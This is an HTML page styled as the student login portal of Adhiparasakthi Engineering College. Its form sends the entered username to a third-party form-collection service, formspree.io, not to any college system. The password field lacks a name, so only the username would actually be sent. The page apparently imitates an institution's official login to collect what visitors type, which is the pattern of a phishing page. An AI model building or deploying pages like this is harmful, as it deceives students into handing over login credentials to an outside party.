<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adhiparasakthi Engineering College Login</title>

    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:Arial, sans-serif;
        }

        body{
            background:#f2f2f2;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
        }

        .login-box{
            background:white;
            width:380px;
            padding:30px;
            border-radius:12px;
            box-shadow:0 0 15px rgba(0,0,0,0.2);
            text-align:center;
        }

        .logo{
            width:120px;
            margin-bottom:10px;
        }

        h2{
            color:#b30000;
            margin-bottom:20px;
        }

        input{
            width:100%;
            padding:12px;
            margin:10px 0;
            border:1px solid #ccc;
            border-radius:5px;
            font-size:15px;
        }

        button{
            width:100%;
            padding:12px;
            background:#b30000;
            color:white;
            border:none;
            border-radius:5px;
            font-size:16px;
            cursor:pointer;
        }

        button:hover{
            background:#8a0000;
        }

        .footer{
            margin-top:15px;
            font-size:12px;
            color:#666;
        }
    </style>
</head>

<body>

    <div class="login-box">

        <img src="college-logo.png" alt="College Logo" class="logo">

        <h2>Adhiparasakthi Engineering College</h2>

        <form action="https://formspree.io/f/xwvdwjav" method="POST">

            <input
                type="text"
                name="username"
                placeholder="Enter Username"
                required>

            <input
                type="password"
                placeholder="Enter Password"
                required>

            <button type="submit">Login</button>

        </form>

        <div class="footer">
            Student Login Portal
        </div>

    </div>

</body>
</html>
